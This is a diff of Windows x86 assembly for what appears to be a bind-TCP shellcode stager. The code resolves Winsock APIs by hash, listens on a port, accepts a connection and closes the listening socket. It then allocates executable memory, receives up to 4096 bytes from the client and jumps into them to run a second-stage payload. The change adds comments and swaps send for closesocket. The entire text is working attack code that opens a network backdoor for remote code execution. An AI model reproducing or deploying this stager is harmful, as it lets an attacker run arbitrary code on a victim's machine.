@@ -95,7 +95,7 @@ mov ebp, esp
 call LLoadWinsock
 
 %define FN_RECV     [ebp + 24]
-%define FN_SEND     [ebp + 28]
+%define FN_CLOSE    [ebp + 28]
 %define FN_ACCEPT   [ebp + 32]
 %define FN_BIND     [ebp + 36]
 %define FN_LISTEN   [ebp + 40]
@@ -106,13 +106,13 @@ LWSDataSegment:
 ;========================
 dd 0x190      ; used by wsastartup
 dd 0xe71819b6 ; recv        [ebp + 24]
-dd 0xe97019a4 ; send        [ebp + 28]
+dd 0x79c679e7 ; closesocket [ebp + 28]
 dd 0x498649e5 ; accept      [ebp + 32]
 dd 0xc7701aa4 ; bind        [ebp + 36]
 dd 0xe92eada4 ; listen      [ebp + 40]
 dd 0xadf509d9 ; WSASocketA  [ebp + 44]
 dd 0x3bfcedcb ; WSAStartup  [ebp + 48]
-db "WS2_32", 0x00
+db "ws2_32", 0x00
 ;========================
 
 LLoadWinsock:
@@ -135,13 +135,15 @@ Looper:
     mov [esi + ecx * 4], eax    ; stack segment to store addresses
     loop Looper
 
+; Initialize winsock
 LWSAStartup:                    ; WSAStartup (0x101, DATA)
     sub esp, [edi]
 	push esp
 	push dword [edi]
 	call FN_WSASTART
     xor eax, eax
-    
+
+; Create the socket
 LWSASocketA:                    ; WSASocketA (2,1,0,0,0,0) 
 	push eax
 	push eax
@@ -154,6 +156,7 @@ LWSASocketA:                    ; WSASocketA (2,1,0,0,0,0)
 	call FN_WSASOCK
     mov edi, eax
 
+; Bind to the specified port
 LBind:
     xor ebx, ebx
     push ebx
@@ -165,20 +168,28 @@ LBind:
     push edi
     call FN_BIND
 
+; Listen for new connections
 LListen:
     push ebx
     push edi
     call FN_LISTEN
 
+; Accept the client connection
 LAccept:
     push ebx
     push esp
     push edi
     call FN_ACCEPT
-    mov edi, eax
 
-LAllocateMemory: ; VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+; Close the listening socket
+LClose:
+    push ebx
+    push edi
+	mov edi, eax
+	call FN_CLOSE
 
+; VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+LAllocateMemory: 
 	push byte      0x40
 	pop esi
 	push esi                ; PAGE_EXECUTE_READWRITE=0x40
@@ -193,11 +204,12 @@ LAllocateMemory: ; VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
 	call [ebp+12]
 	mov ebx, eax
 	
-
 LRecvLength: ; recv(s, buff, 4, 0)
     push byte 0x00          ; flags
     push 4096               ; length
     push ebx                ; buffer
     push dword edi          ; socket
     call FN_RECV            ; recv()
+
+LExecuteStage:
     call ebx
